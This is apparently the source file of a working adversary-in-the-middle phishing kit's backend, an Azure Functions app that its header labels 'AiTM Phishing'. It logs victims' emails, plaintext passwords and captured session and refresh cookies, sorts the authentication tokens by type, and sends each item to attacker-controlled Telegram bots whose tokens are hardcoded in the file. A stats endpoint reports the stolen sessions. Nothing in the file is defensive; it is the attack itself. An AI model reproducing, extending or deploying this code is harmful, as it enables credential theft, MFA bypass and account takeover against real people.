/**
 * Comprehensive Logging Function for AiTM Phishing
 * Captures detailed session data, cookies, and authentication flows
 */

const { app } = require("@azure/functions");

// Telegram Bot Configuration
const TELEGRAM_BOT_1 = {
  token: "7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U",
  chatId: "6263177378"
};

const TELEGRAM_BOT_2 = {
  token: "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps",
  chatId: null
};

// Session storage
const sessionData = new Map();
const cookieSessions = new Map();

async function sendToTelegram(message, bot = TELEGRAM_BOT_1) {
  try {
    const url = `https://api.telegram.org/bot${bot.token}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        chat_id: bot.chatId, 
        text: message, 
        parse_mode: "HTML" 
      }),
    });
  } catch (err) {
    console.error("Telegram error:", err);
  }
}

async function sendToAllBots(message) {
  await sendToTelegram(message, TELEGRAM_BOT_1);
  if (TELEGRAM_BOT_2.chatId) {
    await sendToTelegram(message, TELEGRAM_BOT_2);
  }
}

async function getTelegramChatId(botToken) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
    const data = await response.json();
    if (data.ok && data.result.length > 0) {
      return data.result[0].message.chat.id.toString();
    }
  } catch (err) {
    console.error("Error fetching chat ID:", err);
  }
  return null;
}

function parseCookie(cookieString) {
  const parts = cookieString.split(';');
  const nameValue = parts[0].split('=');
  const cookie = {
    name: nameValue[0].trim(),
    value: nameValue[1] || '',
    domain: '',
    path: '',
    expires: '',
    secure: false,
    httpOnly: false,
    sameSite: ''
  };
  
  parts.slice(1).forEach(part => {
    const [key, value] = part.trim().split('=');
    const lowerKey = key.toLowerCase();
    
    switch(lowerKey) {
      case 'domain':
        cookie.domain = value;
        break;
      case 'path':
        cookie.path = value;
        break;
      case 'expires':
        cookie.expires = value;
        break;
      case 'secure':
        cookie.secure = true;
        break;
      case 'httponly':
        cookie.httpOnly = true;
        break;
      case 'samesite':
        cookie.sameSite = value;
        break;
    }
  });
  
  return cookie;
}

function analyzeCookieValue(cookie) {
  const analysis = {
    type: 'unknown',
    containsJWT: false,
    containsRefreshToken: false,
    containsSessionToken: false,
    length: cookie.value.length,
    encoding: 'unknown'
  };
  
  const value = cookie.value;
  
  // Check for JWT tokens (3 parts separated by dots)
  if (value.split('.').length === 3) {
    analysis.containsJWT = true;
    analysis.type = 'jwt';
  }
  
  // Check for refresh tokens
  if (cookie.name.toLowerCase().includes('refresh') || 
      cookie.name.toLowerCase().includes('rt') ||
      cookie.name.toLowerCase().includes('persistent')) {
    analysis.containsRefreshToken = true;
    analysis.type = 'refresh_token';
  }
  
  // Check for session tokens
  if (cookie.name.toLowerCase().includes('session') ||
      cookie.name.toLowerCase().includes('sess') ||
      cookie.name.toLowerCase().includes('state')) {
    analysis.containsSessionToken = true;
    analysis.type = 'session_token';
  }
  
  // Check for authentication tokens
  if (cookie.name.toLowerCase().includes('auth') ||
      cookie.name.toLowerCase().includes('token') ||
      cookie.name.toLowerCase().includes('estauth')) {
    analysis.type = 'auth_token';
  }
  
  // Determine encoding
  if (/^[A-Za-z0-9+/]*={0,2}$/.test(value)) {
    analysis.encoding = 'base64';
  } else if (/^[A-Fa-f0-9]+$/.test(value)) {
    analysis.encoding = 'hex';
  } else if (/^[A-Za-z0-9\-_]+$/.test(value)) {
    analysis.encoding = 'base64url';
  }
  
  return analysis;
}

function generateSessionReport(sessionId, data) {
  const report = {
    sessionId,
    timestamp: new Date().toISOString(),
    ip: data.ip,
    userAgent: data.userAgent,
    accountType: data.accountType,
    email: data.email,
    events: data.events || [],
    cookies: data.cookies || [],
    requests: data.requests || [],
    summary: {
      totalEvents: (data.events || []).length,
      totalCookies: (data.cookies || []).length,
      totalRequests: (data.requests || []).length,
      authCookies: (data.cookies || []).filter(c => c.analysis.type === 'auth_token').length,
      refreshTokens: (data.cookies || []).filter(c => c.analysis.containsRefreshToken).length,
      sessionTokens: (data.cookies || []).filter(c => c.analysis.containsSessionToken).length
    }
  };
  
  return report;
}

app.http("logging", {
  methods: ["POST"],
  authLevel: "anonymous",
  route: "/__log",
  handler: async (request, context) => {
    // Initialize Telegram chat ID for bot 2 if not set
    if (!TELEGRAM_BOT_2.chatId) {
      TELEGRAM_BOT_2.chatId = await getTelegramChatId(TELEGRAM_BOT_2.token);
    }

    const body = await request.json();
    const { sessionId, event, data } = body;
    
    if (!sessionData.has(sessionId)) {
      sessionData.set(sessionId, {
        ip: data.ip,
        userAgent: data.userAgent,
        accountType: data.accountType,
        email: data.email,
        events: [],
        cookies: [],
        requests: [],
        startTime: Date.now()
      });
    }
    
    const session = sessionData.get(sessionId);
    
    // Add event
    session.events.push({
      type: event,
      timestamp: Date.now(),
      data: data
    });
    
    // Handle different event types
    switch(event) {
      case 'session_start':
        await sendToAllBots(`🚀 <b>New Session Started</b>\n🆔 <b>Session ID:</b> ${sessionId}\n🌐 <b>IP:</b> ${data.ip}\n📱 <b>Account Type:</b> ${data.accountType}\n🔗 <b>URL:</b> ${data.url}`);
        break;
        
      case 'email_entered':
        session.email = data.email;
        await sendToAllBots(`📧 <b>Email Entered</b>\n🆔 <b>Session ID:</b> ${sessionId}\n👤 <b>Email:</b> ${data.email}\n🌐 <b>IP:</b> ${data.ip}\n🔗 <b>URL:</b> ${data.url}`);
        break;
        
      case 'password_entered':
        await sendToAllBots(`🔑 <b>Password Entered</b>\n🆔 <b>Session ID:</b> ${sessionId}\n👤 <b>Email:</b> ${data.email}\n🌐 <b>IP:</b> ${data.ip}\n🔗 <b>URL:</b> ${data.url}`);
        break;
        
      case 'credentials_submitted':
        await sendToAllBots(`🔐 <b>Credentials Submitted!</b>\n🆔 <b>Session ID:</b> ${sessionId}\n👤 <b>Email:</b> ${data.email}\n🔑 <b>Password:</b> ${data.password}\n🌐 <b>IP:</b> ${data.ip}\n📱 <b>Account Type:</b> ${data.accountType}`);
        break;
        
      case 'cookies_captured':
        const cookies = data.cookies.map(cookieString => {
          const parsed = parseCookie(cookieString);
          const analysis = analyzeCookieValue(parsed);
          return { ...parsed, analysis };
        });
        
        session.cookies.push(...cookies);
        
        const cookieSummary = cookies.reduce((acc, cookie) => {
          acc[cookie.analysis.type] = (acc[cookie.analysis.type] || 0) + 1;
          return acc;
        }, {});
        
        await sendToAllBots(`🍪 <b>Cookies Captured</b>\n🆔 <b>Session ID:</b> ${sessionId}\n👤 <b>Email:</b> ${data.email}\n📊 <b>Total:</b> ${cookies.length}\n📋 <b>Types:</b> ${Object.entries(cookieSummary).map(([k,v]) => `${k}:${v}`).join(', ')}`);
        
        // Send detailed cookie information
        cookies.forEach(cookie => {
          const cookieInfo = `🍪 <b>Cookie: ${cookie.name}</b>\n📊 <b>Type:</b> ${cookie.analysis.type}\n🔢 <b>Length:</b> ${cookie.analysis.length}\n🔤 <b>Encoding:</b> ${cookie.analysis.encoding}\n🔐 <b>Secure:</b> ${cookie.secure}\n🌐 <b>Domain:</b> ${cookie.domain}\n📁 <b>Path:</b> ${cookie.path}`;
          sendToAllBots(cookieInfo);
        });
        break;
        
      case 'session_complete':
        const report = generateSessionReport(sessionId, session);
        const sessionSummary = `✅ <b>Session Complete</b>\n🆔 <b>Session ID:</b> ${sessionId}\n👤 <b>Email:</b> ${session.email}\n🌐 <b>IP:</b> ${session.ip}\n📱 <b>Account Type:</b> ${session.accountType}\n📊 <b>Total Events:</b> ${report.summary.totalEvents}\n🍪 <b>Total Cookies:</b> ${report.summary.totalCookies}\n🔐 <b>Auth Cookies:</b> ${report.summary.authCookies}\n🔄 <b>Refresh Tokens:</b> ${report.summary.refreshTokens}\n⏱️ <b>Duration:</b> ${Math.round((Date.now() - session.startTime) / 1000)}s`;
        
        await sendToAllBots(sessionSummary);
        
        // Store session data for later analysis
        cookieSessions.set(sessionId, report);
        break;
        
      case 'error':
        await sendToAllBots(`❌ <b>Error in Session</b>\n🆔 <b>Session ID:</b> ${sessionId}\n👤 <b>Email:</b> ${data.email}\n🌐 <b>IP:</b> ${data.ip}\n🚨 <b>Error:</b> ${data.error}\n🔗 <b>URL:</b> ${data.url}`);
        break;
    }
    
    return new Response("ok", { status: 200 });
  },
});

// Function to get session statistics
app.http("stats", {
  methods: ["GET"],
  authLevel: "anonymous",
  route: "/__stats",
  handler: async (request, context) => {
    const stats = {
      activeSessions: sessionData.size,
      completedSessions: cookieSessions.size,
      totalEvents: Array.from(sessionData.values()).reduce((acc, session) => acc + session.events.length, 0),
      totalCookies: Array.from(sessionData.values()).reduce((acc, session) => acc + session.cookies.length, 0),
      accountTypes: {},
      recentSessions: Array.from(cookieSessions.values()).slice(-10)
    };
    
    // Count account types
    Array.from(sessionData.values()).forEach(session => {
      stats.accountTypes[session.accountType] = (stats.accountTypes[session.accountType] || 0) + 1;
    });
    
    return new Response(JSON.stringify(stats, null, 2), {
      status: 200,
      headers: { "Content-Type": "application/json" }
    });
  },
});
